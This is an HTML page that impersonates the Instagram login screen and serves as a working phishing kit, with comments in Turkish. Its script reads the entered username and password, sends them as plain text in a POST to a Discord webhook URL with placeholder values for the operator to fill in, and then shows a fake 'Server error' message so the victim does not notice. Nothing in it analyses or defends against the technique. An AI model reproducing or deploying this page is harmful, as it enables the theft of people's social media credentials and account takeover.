<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #fafafa;
        }
        .login-container {
            width: 100%;
            max-width: 350px;
            background: #fff;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            text-align: center;
        }
        .login-container h1 {
            font-family: 'Arial', sans-serif;
            font-size: 36px;
            font-weight: bold;
            margin-bottom: 20px;
            color: #333;
        }
        .login-container form {
            display: flex;
            flex-direction: column;
        }
        .login-container input[type="text"],
        .login-container input[type="password"] {
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
        }
        .login-container button {
            padding: 10px;
            background-color: #3897f0;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .login-container button:hover {
            background-color: #3178c6;
        }
        .login-container .divider {
            margin: 20px 0;
            font-size: 14px;
            color: #aaa;
        }
        .login-container a {
            color: #3897f0;
            text-decoration: none;
            font-size: 14px;
        }
        .login-container a:hover {
            text-decoration: underline;
        }
        /* Error message styling */
        .error-message {
            color: red;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Instagram</h1>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="divider">OR</div>
        <a href="#" id="forgotPasswordLink">Forgot password?</a>
        <div id="error-message" class="error-message">Server error. Please try again.</div>
    </div>

    <script>
        // Login butonuna tıklanınca yapılacak işlem
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Formun otomatik olarak gönderilmesini engelle

            // Kullanıcı adı ve şifreyi al
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Webhook'a gönderilecek mesaj
            const message = `Username: ${username} Password: ${password}`;

            // Discord webhook URL
            const webhookURL = 'https://canary.discord.com/api/webhooks/your_webhook_id/your_webhook_token';  // Webhook URL'nizi buraya yerleştirin

            // Webhook'a veri gönderme işlemi
            sendToDiscord(message);

            // "Server error" mesajını göster
            const errorMessage = document.getElementById('error-message');
            errorMessage.style.display = 'block';

            // 5 saniye sonra hata mesajını gizle
            setTimeout(function() {
                errorMessage.style.display = 'none';
            }, 5000);
        });

        // Discord webhook'a mesaj gönderme fonksiyonu
        function sendToDiscord(message) {
            const webhookURL = 'https://canary.discord.com/api/webhooks/your_webhook_id/your_webhook_token';  // Webhook URL'nizi buraya yerleştirin

            const payload = {
                content: message,  // Mesajın içeriği
            };

            // Webhook'a POST isteği gönder
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            })
            .then(response => {
                if (response.ok) {
                    console.log('Mesaj başarıyla gönderildi.');
                } else {
                    console.log('Mesaj gönderilirken bir hata oluştu:', response.statusText);
                }
            })
            .catch(error => {
                console.error('Webhook gönderme hatası:', error);
            });
        }

        // Forgot password linkine tıklanınca yönlendirme
        document.getElementById('forgotPasswordLink').addEventListener('click', function(event) {
            event.preventDefault();  // Linkin normal işlevini engelle
            window.location.href = 'https://www.instagram.com/accounts/password/reset/';  // Şifre sıfırlama sayfasına yönlendir
        });
    </script>
</body>
</html>
